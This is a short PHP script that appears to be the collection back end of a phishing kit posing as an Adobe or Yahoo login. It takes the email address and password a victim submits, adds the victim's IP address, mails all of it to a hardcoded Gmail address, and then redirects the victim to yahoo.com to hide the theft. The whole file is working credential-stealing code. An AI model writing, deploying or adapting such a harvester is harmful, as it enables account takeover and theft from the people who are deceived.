<?
$ip = getenv("REMOTE_ADDR");
$message .= "-----------  ! +ADOBE FILE! xDD+ !  -----------\n";
$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Email Address        : ".$_POST['logn']."\n";
$message .= "Password               : ".$_POST['password']."\n";
$message .= "IP Address             : ".$ip."\n";
$message .= "-----------  ! +Powered by tycontechnologies+ !  -----------\n";
$send = "zinibukky@gmail.com";

$subject = "YAHOO FILE! xD $ip";
$headers = "From:  Mzta Morgan";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);


header("Location: http://www.yahoo.com");
?>



